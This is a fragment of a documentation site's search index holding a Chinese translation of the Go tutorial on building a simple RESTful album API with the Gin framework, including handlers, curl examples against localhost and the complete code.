\u4ee5\u5c06\u7ed3\u6784\u5e8f\u5217\u5316\u4e3a JSON \u5e76\u5c06\u5176\u6dfb\u52a0\u5230\u54cd\u5e94\u4e2d\u3002 \u8be5\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u60a8\u8981\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u7684 HTTP \u72b6\u6001\u4ee3\u7801\u3002\u5728\u8fd9\u91cc\uff0c\u60a8\u4ece net/http \u5305\u4e2d\u4f20\u9012\u5e38\u91cf StatusOK \u6765\u6307\u793a 200 OK . \u8bf7\u6ce8\u610f\uff0c\u60a8\u53ef\u4ee5\u66ff\u6362 Context.IndentedJSON \u4e3a\u8c03\u7528 Context.JSON \u6765\u53d1\u9001\u66f4\u7d27\u51d1\u7684 JSON\u3002\u5728\u5b9e\u8df5\u4e2d\uff0c\u7f29\u8fdb\u5f62\u5f0f\u5728\u8c03\u8bd5\u65f6\u66f4\u5bb9\u6613\u4f7f\u7528\uff0c\u5e76\u4e14\u5927\u5c0f\u5dee\u5f02\u901a\u5e38\u5f88\u5c0f\u3002 \u5728 main.go \u9876\u90e8\u9644\u8fd1\uff0c\u5c31\u5728 albums slice \u58f0\u660e\u7684\u4e0b\u65b9\uff0c\u7c98\u8d34\u4e0b\u9762\u7684\u4ee3\u7801\u4ee5\u5c06\u5904\u7406\u51fd\u6570\u5206\u914d\u7ed9\u7aef\u70b9\u8def\u5f84\u3002 \u8fd9\u4f1a\u5efa\u7acb\u4e00\u4e2a\u5173\u8054\uff0c\u5728\u8be5\u5173\u8054\u4e2d getAlbums \u5904\u7406\u5bf9 /albums \u7aef\u70b9\u8def\u5f84\u7684\u8bf7\u6c42\u3002 func main() { router := gin.Default() router.GET(\"/albums\", getAlbums) router.Run(\"localhost:8080\") } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u4f7f\u7528 Default \u521d\u59cb\u5316 Gin router \u3002 \u4f7f\u7528\u8be5 GET \u51fd\u6570\u5c06 GET HTTP \u65b9\u6cd5\u548c /albums \u8def\u5f84\u4e0e\u5904\u7406\u51fd\u6570\u76f8\u5173\u8054\u3002 \u8bf7\u6ce8\u610f\uff0c\u60a8\u6b63\u5728\u4f20\u9012 getAlbums \u51fd\u6570\u7684\u540d\u79f0\u3002\u8fd9\u4e0e\u4f20\u9012\u51fd\u6570\u7684\u7ed3\u679c\u4e0d\u540c\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u4f20\u9012 getAlbums() \uff08\u6ce8\u610f\u62ec\u53f7\uff09\u6765\u5b8c\u6210\u3002 \u4f7f\u7528 Run \u51fd\u6570\u5c06 router \u8fde\u63a5\u5230 http.Server \u5e76\u542f\u52a8server\u3002 \u5728 main.go \u9876\u90e8\u9644\u8fd1\uff0c\u5c31\u5728\u5305\u58f0\u660e\u7684\u4e0b\u65b9\uff0c\u5bfc\u5165\u60a8\u9700\u8981\u652f\u6301\u60a8\u521a\u521a\u7f16\u5199\u7684\u4ee3\u7801\u7684\u5305\u3002 \u7b2c\u4e00\u884c\u4ee3\u7801\u5e94\u5982\u4e0b\u6240\u793a\uff1a package main import ( \"net/http\" \"github.com/gin-gonic/gin\" ) \u4fdd\u5b58 main.go\u3002 4.2. \u8fd0\u884c\u4ee3\u7801 \uf0c1 \u5f00\u59cb\u8ddf\u8e2a Gin \u6a21\u5757\u4f5c\u4e3a\u4f9d\u8d56\u9879\u3002 \u5728\u547d\u4ee4\u884c\u4e2d\uff0c\u4f7f\u7528 go get \u5c06 github.com/gin-gonic/gin \u6a21\u5757\u6dfb\u52a0\u4e3a\u60a8\u7684\u6a21\u5757\u7684\u4f9d\u8d56\u9879\u3002\u4f7f\u7528\u70b9\u53c2\u6570\u8868\u793a\u201c\u83b7\u53d6\u5f53\u524d\u76ee\u5f55\u4e2d\u4ee3\u7801\u7684\u4f9d\u8d56\u9879\u201d\u3002 $ go get . go get: added github.com/gin-gonic/gin v1.7.2 \u89e3\u51b3\u5e76\u4e0b\u8f7d\u6b64\u4f9d\u8d56\u9879\u4ee5\u6ee1\u8db3\u60a8\u5728\u4e0a\u4e00\u6b65\u4e2d\u6dfb\u52a0\u7684 import \u58f0\u660e\u3002 \u5728\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\u4e0b\u8fd0\u884c\u4ee3\u7801\u3002\u4f7f\u7528\u70b9\u53c2\u6570\u8868\u793a\u201c\u5728\u5f53\u524d\u76ee\u5f55\u4e2d\u8fd0\u884c\u4ee3\u7801\u201d\u3002 $ go run . \u4ee3\u7801\u8fd0\u884c\u540e\uff0c\u60a8\u5c31\u6709\u4e86\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684 HTTP \u670d\u52a1\u5668\uff0c\u60a8\u53ef\u4ee5\u5411\u5176\u53d1\u9001\u8bf7\u6c42\u3002 \u5728\u65b0\u7684\u547d\u4ee4\u884c\u7a97\u53e3\u4e2d\uff0c\u7528\u4e8e curl \u5411\u6b63\u5728\u8fd0\u884c\u7684 Web \u670d\u52a1\u53d1\u51fa\u8bf7\u6c42\u3002 $ curl http://localhost:8080/albums \u8be5\u547d\u4ee4\u5e94\u663e\u793a\u60a8\u4e3a\u670d\u52a1\u64ad\u79cd\u7684\u6570\u636e\u3002 [ { \"id\": \"1\", \"title\": \"Blue Train\", \"artist\": \"John Coltrane\", \"price\": 56.99 }, { \"id\": \"2\", \"title\": \"Jeru\", \"artist\": \"Gerry Mulligan\", \"price\": 17.99 }, { \"id\": \"3\", \"title\": \"Sarah Vaughan and Clifford Brown\", \"artist\": \"Sarah Vaughan\", \"price\": 39.99 } ] \u4f60\u5df2\u7ecf\u542f\u52a8\u4e86\u4e00\u4e2a API\uff01\u5728\u4e0b\u4e00\u90e8\u5206\u4e2d\uff0c\u60a8\u5c06\u4f7f\u7528\u4ee3\u7801\u521b\u5efa\u53e6\u4e00\u4e2a\u7aef\u70b9\u6765\u5904\u7406POST\u6dfb\u52a0\u9879\u76ee\u7684\u8bf7\u6c42\u3002 5. \u6dfb\u52a0\u4e00\u4e2a\u65b0\u9879\u76ee \uf0c1 \u5f53\u5ba2\u6237\u7aef\u5728 /albums \u53d1\u51fa POST \u8bf7\u6c42\u65f6\uff0c\u60a8\u5e0c\u671b\u5c06\u8bf7\u6c42\u6b63\u6587\u4e2d\u63cf\u8ff0\u7684\u76f8\u518c\u6dfb\u52a0\u5230\u73b0\u6709\u76f8\u518c\u7684\u6570\u636e\u4e2d\u3002 \u4e3a\u6b64\uff0c\u60a8\u5c06\u7f16\u5199\u4ee5\u4e0b\u5185\u5bb9\uff1a \u5c06\u65b0\u4e13\u8f91\u6dfb\u52a0\u5230\u73b0\u6709\u5217\u8868\u7684\u903b\u8f91\u3002 \u5c06 POST \u8bf7\u6c42\u8def\u7531\u5230\u60a8\u7684\u903b\u8f91\u7684\u4e00\u4e9b\u4ee3\u7801\u3002 5.1. \u7f16\u5199\u4ee3\u7801 \uf0c1 \u6dfb\u52a0\u4ee3\u7801\u4ee5\u5c06\u4e13\u8f91\u6570\u636e\u6dfb\u52a0\u5230\u4e13\u8f91\u5217\u8868\u3002 \u5728 import \u8bed\u53e5\u4e4b\u540e\u7684\u67d0\u5904\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u3002\uff08\u6587\u4ef6\u672b\u5c3e\u662f\u8fd9\u6bb5\u4ee3\u7801\u7684\u597d\u5730\u65b9\uff0c\u4f46 Go \u5e76\u4e0d\u5f3a\u5236\u4f60\u58f0\u660e\u51fd\u6570\u7684\u987a\u5e8f\u3002\uff09 // postAlbums adds an album from JSON received in the request body. func postAlbums(c *gin.Context) { var newAlbum album // Call BindJSON to bind the received JSON to // newAlbum. if err := c.BindJSON(&newAlbum); err != nil { return } // Add the new album to the slice. albums = append(albums, newAlbum) c.IndentedJSON(http.StatusCreated, newAlbum) } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u7528 Context.BindJSON \u5c06\u8bf7\u6c42\u6b63\u6587\u7ed1\u5b9a\u5230 newAlbum . \u5c06\u4ece JSON \u521d\u59cb\u5316\u7684 album \u7ed3\u6784\u8ffd\u52a0\u5230 albums \u5207\u7247\u3002 \u5411\u54cd\u5e94response\u6dfb\u52a0\u72b6\u6001\u4ee3\u7801 201 \uff0c\u4ee5\u53ca\u8868\u793a\u60a8\u6dfb\u52a0\u7684\u4e13\u8f91\u7684 JSON\u3002 \u66f4\u6539\u60a8\u7684 main \u51fd\u6570\uff0c\u4f7f\u5176\u5305\u542b\u8be5 router.POST \u51fd\u6570\uff0c\u5982\u4e0b\u6240\u793a\u3002 func main() { router := gin.Default() router.GET(\"/albums\", getAlbums) router.POST(\"/albums\", postAlbums) router.Run(\"localhost:8080\") } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u5c06 /albums \u8def\u5f84\u7684 POST \u65b9\u6cd5\u4e0e postAlbums \u51fd\u6570\u76f8\u5173\u8054\u3002 \u4f7f\u7528 Gin\uff0c\u60a8\u53ef\u4ee5\u5c06 \u5904\u7406\u7a0b\u5e8f \u4e0e HTTP \u65b9\u6cd5\u548c\u8def\u5f84\u7ec4\u5408 \u76f8\u5173\u8054\u3002\u8fd9\u6837\uff0c\u60a8\u53ef\u4ee5\u6839\u636e\u5ba2\u6237\u7aef\u4f7f\u7528\u7684\u65b9\u6cd5\u5c06\u53d1\u9001\u5230\u5355\u4e2a\u8def\u5f84\u7684\u8bf7\u6c42\u5355\u72ec\u8def\u7531\u3002 5.2. \u8fd0\u884c\u4ee3\u7801 \uf0c1 \u5982\u679c\u670d\u52a1\u5668\u4ece\u4e0a\u4e00\u8282\u5f00\u59cb\u4ecd\u5728\u8fd0\u884c\uff0c\u8bf7\u505c\u6b62\u5b83\u3002 \u5728\u5305\u542b main.go \u7684\u76ee\u5f55\u6253\u5f00\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . \u4ece\u4e0d\u540c\u7684\u547d\u4ee4\u884c\u7a97\u53e3\uff0c\u7528 curl \u5411\u6b63\u5728\u8fd0\u884c\u7684 Web \u670d\u52a1\u53d1\u51fa\u8bf7\u6c42\u3002 $ curl http://localhost:8080/albums \\ --include \\ --header \"Content-Type: application/json\" \\ --request \"POST\" \\ --data '{\"id\": \"4\",\"title\": \"The Modern Sound of Betty Carter\",\"artist\": \"Betty Carter\",\"price\": 49.99}' \u8be5\u547d\u4ee4\u5e94\u663e\u793a\u6dfb\u52a0\u4e13\u8f91\u7684\u6807\u9898\u548c JSON\u3002 HTTP/1.1 201 Created Content-Type: application/json; charset=utf-8 Date: Wed, 02 Jun 2021 00:34:12 GMT Content-Length: 116 { \"id\": \"4\", \"title\": \"The Modern Sound of Betty Carter\", \"artist\": \"Betty Carter\", \"price\": 49.99 } \u4e0e\u4e0a\u4e00\u8282\u4e00\u6837\uff0c\u4f7f\u7528 curl \u68c0\u7d22\u5b8c\u6574\u7684\u4e13\u8f91\u5217\u8868\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u786e\u8ba4\u6dfb\u52a0\u4e86\u65b0\u4e13\u8f91\u3002 $ curl http://localhost:8080/albums \\ --header \"Content-Type: application/json\" \\ --request \"GET\" \u8be5\u547d\u4ee4\u5e94\u663e\u793a\u4e13\u8f91\u5217\u8868\u3002 [ { \"id\": \"1\", \"title\": \"Blue Train\", \"artist\": \"John Coltrane\", \"price\": 56.99 }, { \"id\": \"2\", \"title\": \"Jeru\", \"artist\": \"Gerry Mulligan\", \"price\": 17.99 }, { \"id\": \"3\", \"title\": \"Sarah Vaughan and Clifford Brown\", \"artist\": \"Sarah Vaughan\", \"price\": 39.99 }, { \"id\": \"4\", \"title\": \"The Modern Sound of Betty Carter\", \"artist\": \"Betty Carter\", \"price\": 49.99 } ] \u5728\u4e0b\u4e00\u90e8\u5206\u4e2d\uff0c\u60a8\u5c06\u6dfb\u52a0\u4ee3\u7801\u6765\u5904\u7406GET\u7279\u5b9a\u9879\u76ee\u7684\u8bf7\u6c42\u3002 6. \u67e5\u8be2\u7279\u5b9a\u7684\u9879\u76ee \uf0c1 \u5f53\u5ba2\u6237\u7aef\u53d1\u51fa GET /albums/[id] \u8bf7\u6c42\u65f6\uff0c\u60a8\u5e0c\u671b\u8fd4\u56de ID \u4e0eid\u8def\u5f84\u53c2\u6570\u5339\u914d\u7684\u4e13\u8f91\u3002 \u4e3a\u6b64\uff0c\u60a8\u5c06\uff1a \u6dfb\u52a0\u903b\u8f91\u4ee5\u68c0\u7d22\u8bf7\u6c42\u7684\u76f8\u518c\u3002 \u5c06\u8def\u5f84\u6620\u5c04\u5230\u903b\u8f91\u3002 6.1. \u7f16\u5199\u4ee3\u7801 \uf0c1 \u5728\u60a8\u5728\u4e0a\u4e00\u8282\u4e2d\u6dfb\u52a0\u7684 postAlbums \u51fd\u6570\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u4ee5\u68c0\u7d22\u7279\u5b9a\u76f8\u518c\u3002 \u6b64 getAlbumByID \u51fd\u6570\u5c06\u63d0\u53d6\u8bf7\u6c42\u8def\u5f84\u4e2d\u7684 ID\uff0c\u7136\u540e\u627e\u5230\u5339\u914d\u7684\u76f8\u518c\u3002 // getAlbumByID locates the album whose ID value matches the id // parameter sent by the client, then returns that album as a response. func getAlbumByID(c *gin.Context) { id := c.Param(\"id\") // Loop over the list of albums, looking for // an album whose ID value matches the parameter. for _, a := range albums { if a.ID == id { c.IndentedJSON(http.StatusOK, a) return } } c.IndentedJSON(http.StatusNotFound, gin.H{\"message\": \"album not found\"}) } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u7528 Context.Param \u4ece URL \u4e2d\u68c0\u7d22 id \u8def\u5f84\u53c2\u6570\u3002\u5f53\u60a8\u5c06\u6b64\u5904\u7406\u7a0b\u5e8f\u6620\u5c04\u5230\u8def\u5f84\u65f6\uff0c\u60a8\u5c06\u5728\u8def\u5f84\u4e2d\u5305\u542b\u53c2\u6570\u7684\u5360\u4f4d\u7b26\u3002 \u5faa\u73af album \u5207\u7247\u4e2d\u7684\u7ed3\u6784\uff0c\u5bfb\u627e\u5176 ID \u5b57\u6bb5\u503c\u4e0e id \u53c2\u6570\u503c\u5339\u914d\u7684\u7ed3\u6784\u3002\u5982\u679c\u627e\u5230\uff0c\u5219\u5c06\u8be5 album \u7ed3\u6784\u5e8f\u5217\u5316\u4e3a JSON\uff0c\u5e76\u5c06\u5176\u4f5c\u4e3a\u54cd\u5e94\u4e0e 200 OK HTTP \u4ee3\u7801\u4e00\u540c\u8fd4\u56de\u3002 \u5982\u4e0a\u6240\u8ff0\uff0c\u73b0\u5b9e\u4e16\u754c\u7684\u670d\u52a1\u53ef\u80fd\u4f1a\u4f7f\u7528\u6570\u636e\u5e93\u67e5\u8be2\u6765\u6267\u884c\u6b64\u67e5\u627e\u3002 \u5982\u679c\u627e\u4e0d\u5230\u4e13\u8f91\uff0c\u5219\u8fd4\u56de http.StatusNotFound \u5373 HTTP 404 \u9519\u8bef\u3002 \u6700\u540e\uff0c\u66f4\u6539\u60a8\u7684main\uff0c\u4f7f\u5176\u5305\u542b\u5bf9\u8def\u5f84\u4e3a /albums/:id \u7684\u65b0\u8c03\u7528 router.GET \uff0c\u5982\u4ee5\u4e0b\u793a\u4f8b\u6240\u793a\u3002 func main() { router := gin.Default() router.GET(\"/albums\", getAlbums) router.GET(\"/albums/:id\", getAlbumByID) router.POST(\"/albums\", postAlbums) router.Run(\"localhost:8080\") } \u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u5c06 /albums/:id \u8def\u5f84\u4e0e getAlbumByID \u51fd\u6570\u76f8\u5173\u8054\u3002\u5728 Gin \u4e2d\uff0c\u8def\u5f84\u4e2d\u9879\u76ee\u524d\u9762\u7684\u5192\u53f7\u8868\u793a\u8be5\u9879\u76ee\u662f\u8def\u5f84\u53c2\u6570\u3002 6.2. \u8fd0\u884c\u4ee3\u7801 \uf0c1 \u5982\u679c\u670d\u52a1\u5668\u4ece\u4e0a\u4e00\u8282\u5f00\u59cb\u4ecd\u5728\u8fd0\u884c\uff0c\u8bf7\u505c\u6b62\u5b83\u3002 \u5728\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u6253\u5f00\u547d\u4ee4\u884c\u4e2d\uff0c\u8fd0\u884c\u4ee3\u7801\u4ee5\u542f\u52a8\u670d\u52a1\u5668\u3002 $ go run . \u4ece\u4e0d\u540c\u7684\u547d\u4ee4\u884c\u7a97\u53e3\uff0c\u7528 curl \u5411\u6b63\u5728\u8fd0\u884c\u7684 Web \u670d\u52a1\u53d1\u51fa\u8bf7\u6c42\u3002 $ curl http://localhost:8080/albums/2 \u8be5\u547d\u4ee4\u5e94\u663e\u793a\u60a8\u4f7f\u7528 ID \u7684\u4e13\u8f91\u7684 JSON\u3002\u5982\u679c\u627e\u4e0d\u5230\u4e13\u8f91\uff0c\u60a8\u5c06\u6536\u5230\u5e26\u6709\u9519\u8bef\u6d88\u606f\u7684 JSON\u3002 { \"id\": \"2\", \"title\": \"Jeru\", \"artist\": \"Gerry Mulligan\", \"price\": 17.99 } \u7ed3\u8bba \uf0c1 \u606d\u559c\uff01\u60a8\u521a\u521a\u4f7f\u7528 Go \u548c Gin \u7f16\u5199\u4e86\u4e00\u4e2a\u7b80\u5355\u7684 RESTful Web \u670d\u52a1\u3002 \u5efa\u8bae\u7684\u4e0b\u4e00\u4e2a\u4e3b\u9898\uff1a \u5982\u679c\u60a8\u662f Go \u65b0\u624b\uff0c\u60a8\u4f1a\u53d1\u73b0 Effective Go \u548c How to write Go code \u4ee3\u7801\u4e2d\u63cf\u8ff0\u7684\u6709\u7528\u7684\u6700\u4f73\u5b9e\u8df5\u3002 Go Tour \u662f\u5bf9 Go \u57fa\u7840\u77e5\u8bc6\u7684\u9010\u6b65\u4ecb\u7ecd\u3002 \u6709\u5173 Gin \u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Gin Web Framework package documentation \u6216 Gin Web Framework docs \u3002 \u5b8c\u6574\u7684\u4ee3\u7801 \uf0c1 \u672c\u8282\u5305\u542b\u60a8\u4f7f\u7528\u672c\u6559\u7a0b\u6784\u5efa\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\u3002 package main import ( \"net/http\" \"github.com/gin-gonic/gin\" ) // album represents data about a record album. type album struct { ID string `json:\"id\"` Title string `json:\"title\"` Artist string `json:\"artist\"` Price float64 `json:\"price\"` } // albums slice to seed record album data. var albums = []album{ {ID: \"1\", Title: \"Blue Train\", Artist: \"John Coltrane\", Price: 56.99}, {ID: \"2\", Title: \"Jeru\", Artist: \"Gerry Mulligan\", Price: 17.99}, {ID: \"3\", Title: \"Sarah Vaughan and Clifford Brown\", Artist: \"Sarah Vaughan\", Price: 39.99}, } func main() { router := gin.Default() router.GET(\"/albums\", getAlbums) router.GET(\"/albums/:id\", getAlbumByID) router.POST(\"/albums\", postAlbums) router.Run(\"localhost:8080\") } // getAlbums responds with the list of all albums as JSON. func getAlbums(c *gin.Context) { c.IndentedJSON(http.StatusOK, albums) } // postAlbums adds an album from JSON received in the request body. func postAlbums(c *gin.Context) { var newAlbum album // Call BindJSON to bind the received JSON to // newAlbum. if err := c.BindJSON(&newAlbum); err != nil { return } // Add the new album to the slice. albums = append(albums, newAlbum) c.IndentedJSON(http.StatusCreated, newAlbum) } // getAlbumByID locates the album whose ID value matches the id // parameter sent by the client, then returns that album as a response. func getAlbumByID(c *gin.Context) { id := c.Param(\"id\") // Loop through the list of albums, looking for // an album whose ID value matches the parameter. for _, a := range albums { if a.ID == id { c.IndentedJSON(http.StatusOK, a) return } } c.IndentedJSON(http.StatusNotFound, gin.H{\"message\": \"album not found\"}) } \u53c2\u8003 \uf0c1 https://go.dev/doc/tutorial/web-service-gin","title":"Web service gin"},{"location":"go/web_service_gin/#web-service-gin","text":"\u672c\u6559\u7a0b\u4ecb\u7ecd\u4e86\u4f7f\u7528 Go \u548c Gin Web \u6846\u67b6 (Gin) \u7f16\u5199 RESTful Web \u670d\u52a1 API \u7684\u57fa\u7840\u77e5\u8bc6\u3002 Gin \u7b80\u5316\u4e86\u8bb8\u591a\u4e0e\u6784\u5efa Web \u5e94\u7528\u7a0b\u5e8f\uff08\u5305\u62ec Web \u670d\u52a1\uff09\u76f8\u5173\u7684\u7f16\u7801\u4efb\u52a1\u3002\u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u4f7f\u7528 Gin \u6765\u8def\u7531\u8bf7\u6c42\u3001\u68c0\u7d22\u8bf7\u6c42\u8be6\u7ec6\u4fe1\u606f\u4ee5\u53ca\u7f16\u7ec4 JSON \u4ee5\u83b7\u53d6\u54cd\u5e94\u3002 \u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u6784\u5efa\u4e00\u4e2a\u5177\u6709\u4e24\u4e2a\u7aef\u70b9\u7684 RESTful API \u670d\u52a1\u5668\u3002\u60a8\u7684\u793a\u4f8b\u9879\u76ee\u5c06\u662f\u6709\u5173\u8001\u5f0f\u7235\u58eb\u4e50\u5531\u7247\u7684\u6570\u636e\u5b58\u50a8\u5e93\u3002 \u672c\u6559\u7a0b\u5305\u62ec\u4ee5\u4e0b\u90e8\u5206\uff1a \u8bbe\u8ba1 API \u7aef\u70b9\u3002 \u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\u3002 \u521b\u5efa\u6570\u636e\u3002 \u7f16\u5199\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\u4ee5\u8fd4\u56de\u6240\u6709\u9879\u76ee\u3002 \u7f16\u5199\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\u6765\u6dfb\u52a0\u4e00\u4e2a\u65b0\u9879\u76ee\u3002 \u7f16\u5199\u4e00\u4e2a\u5904\u7406\u7a0b\u5e8f\u6765\u8fd4\u56de\u4e00\u4e2a\u7279\u5b9a\u7684\u9879\u76ee\u3002 \u8981\u5c1d\u8bd5\u5c06\u6b64\u4f5c\u4e3a\u60a8\u5728 Google Cloud Shell \u4e2d\u5b8c\u6210\u7684\u4ea4\u4e92\u5f0f\u6559\u7a0b\uff0c\u8bf7\u5355\u51fb\u4e0b\u9762\u7684\u6309\u94ae\u3002 \u672c\u6559\u7a0b\u9700\u8981 Go 1.16 \u6216\u66f4\u9ad8\u7248\u672c\u3002","title":"\u4f7f\u7528 Go \u548c Gin \u5f00\u53d1 RESTful API"},{"location":"go/web_service_gin/#design-api-endpoints","text":"\u60a8\u5c06\u6784\u5efa\u4e00\u4e2a API\uff0c\u8be5 API \u53ef\u8ba9\u60a8\u8bbf\u95ee\u51fa\u552e\u8001\u5f0f\u9ed1\u80f6\u5531\u7247\u7684\u5546\u5e97\u3002\u56e0\u6b64\uff0c\u60a8\u9700\u8981\u63d0\u4f9b\u7aef\u70b9(endpoints)\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u7aef\u70b9\u4e3a\u7528\u6237\u83b7\u53d6\u548c\u6dfb\u52a0\u76f8\u518c\u3002 \u5728\u5f00\u53d1 API \u65f6\uff0c\u60a8\u901a\u5e38\u4ece\u8bbe\u8ba1\u7aef\u70b9\u5f00\u59cb\u3002\u5982\u679c\u7aef\u70b9\u6613\u4e8e\u7406\u89e3\uff0c\u60a8\u7684 API \u7528\u6237\u5c06\u83b7\u5f97\u66f4\u5927\u7684\u6210\u529f\u3002 \u4ee5\u4e0b\u662f\u60a8\u5c06\u5728\u672c\u6559\u7a0b\u4e2d\u521b\u5efa\u7684\u7aef\u70b9\u3002 /albums GET \u2013 \u83b7\u53d6\u6240\u6709\u4e13\u8f91\u7684\u5217\u8868\uff0c\u4ee5 JSON \u5f62\u5f0f\u8fd4\u56de\u3002 POST \u2013 \u4ece\u4f5c\u4e3a JSON \u53d1\u9001\u7684\u8bf7\u6c42\u6570\u636e\u4e2d\u6dfb\u52a0\u65b0\u4e13\u8f91\u3002 /albums/:id GET \u2013 \u901a\u8fc7 ID \u83b7\u53d6\u4e13\u8f91\uff0c\u5c06\u4e13\u8f91\u6570\u636e\u4f5c\u4e3a JSON \u8fd4\u56de\u3002 \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u4e3a\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\u3002","title":"1. \u8bbe\u8ba1 API \u7aef\u70b9"},{"location":"go/web_service_gin/#create-folder-for-code","text":"\u9996\u5148\uff0c\u4e3a\u60a8\u8981\u7f16\u5199\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u9879\u76ee\u3002 \u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\u5e76\u5207\u6362\u5230\u60a8\u7684\u4e3b\u76ee\u5f55\u3002 \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a web-service-gin \u7684\u76ee\u5f55\u3002 $ mkdir web-service-gin $ cd web-service-gin \u521b\u5efa\u4e00\u4e2a\u6a21\u5757\uff0c\u60a8\u53ef\u4ee5\u5728\u5176\u4e2d\u7ba1\u7406\u4f9d\u8d56\u9879\u3002 $ go mod init example/web-service-gin go: creating new go.mod: module example/web-service-gin \u6b64\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a go.mod \u6587\u4ef6\uff0c\u60a8\u6dfb\u52a0\u7684\u4f9d\u8d56\u9879\u5c06\u5728\u5176\u4e2d\u5217\u51fa\u4ee5\u4f9b\u8ddf\u8e2a\u3002\u6709\u5173\u4f7f\u7528\u6a21\u5757\u8def\u5f84\u547d\u540d\u6a21\u5757\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u7ba1\u7406\u4f9d\u8d56\u9879 \u3002","title":"2. \u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939"},{"location":"go/web_service_gin/#create-data","text":"\u4e3a\u4e86\u4f7f\u6559\u7a0b\u7b80\u5355\uff0c\u60a8\u5c06\u6570\u636e\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u3002\u66f4\u5178\u578b\u7684 API \u5c06\u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\u3002 \u8bf7\u6ce8\u610f\uff0c\u5c06\u6570\u636e\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u610f\u5473\u7740\u6bcf\u6b21\u505c\u6b62\u670d\u52a1\u5668\u65f6\uff0c\u76f8\u518c\u96c6\u90fd\u4f1a\u4e22\u5931\uff0c\u7136\u540e\u5728\u542f\u52a8\u65f6\u91cd\u65b0\u521b\u5efa\u3002","title":"3. \u521b\u5efa\u6570\u636e"},{"location":"go/web_service_gin/#write-code-31","text":"\u5728 web-service \u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a main.go \u7684\u6587\u4ef6\u3002\u60a8\u5c06\u5728\u6b64\u6587\u4ef6\u4e2d\u7f16\u5199\u60a8\u7684 Go \u4ee3\u7801\u3002 \u8fdb\u5165 main.go\uff0c\u5728\u6587\u4ef6\u9876\u90e8\uff0c\u7c98\u8d34\u4ee5\u4e0b\u5305\u58f0\u660e\u3002 package main \u72ec\u7acb\u7a0b\u5e8f\uff08\u4e0e\u5e93\u76f8\u53cd\uff09\u59cb\u7ec8\u4f4d\u4e8e package main \u4e2d\u3002 \u5728\u5305\u58f0\u660e\u4e0b\uff0c\u7c98\u8d34\u4ee5\u4e0b album \u7ed3\u6784\u58f0\u660e\u3002\u60a8\u5c06\u4f7f\u7528\u5b83\u5728\u5185\u5b58\u4e2d\u5b58\u50a8\u4e13\u8f91\u6570\u636e\u3002 \u7ed3\u6784\u6807\u8bb0\uff0c\u4f8b\u5982 json:\"artist\" \u6307\u5b9a\u5f53\u7ed3\u6784\u7684\u5185\u5bb9\u88ab\u5e8f\u5217\u5316\u4e3a JSON \u65f6\u5b57\u6bb5\u7684\u540d\u79f0\u5e94\u8be5\u662f\u4ec0\u4e48\u3002\u5982\u679c\u6ca1\u6709\u5b83\u4eec\uff0cJSON \u5c06\u4f7f\u7528\u7ed3\u6784\u7684\u5927\u5199\u5b57\u6bb5\u540d\u79f0\u2014\u2014\u8fd9\u79cd\u98ce\u683c\u5728 JSON \u4e2d\u5e76\u4e0d\u5e38\u89c1\u3002 // album represents data about a record album. type album struct { ID string `json:\"id\"` Title string `json:\"title\"` Artist string `json:\"artist\"` Price float64 `json:\"price\"` } \u5728\u60a8\u521a\u521a\u6dfb\u52a0\u7684\u7ed3\u6784\u58f0\u660e\u4e0b\uff0c\u7c98\u8d34\u4ee5\u4e0b album \u7ed3\u6784\u7247\u6bb5\uff0c\u5176\u4e2d\u5305\u542b\u60a8\u5c06\u7528\u4e8e\u542f\u52a8\u7684\u6570\u636e\u3002 // albums slice to seed record album data. var albums = []album{ {ID: \"1\", Title: \"Blue Train\", Artist: \"John Coltrane\", Price: 56.99}, {ID: \"2\", Title: \"Jeru\", Artist: \"Gerry Mulligan\", Price: 17.99}, {ID: \"3\", Title: \"Sarah Vaughan and Clifford Brown\", Artist: \"Sarah Vaughan\", Price: 39.99}, } \u63a5\u4e0b\u6765\uff0c\u60a8\u5c06\u7f16\u5199\u4ee3\u7801\u6765\u5b9e\u73b0\u60a8\u7684\u7b2c\u4e00\u4e2a\u7aef\u70b9\u3002","title":"3.1. 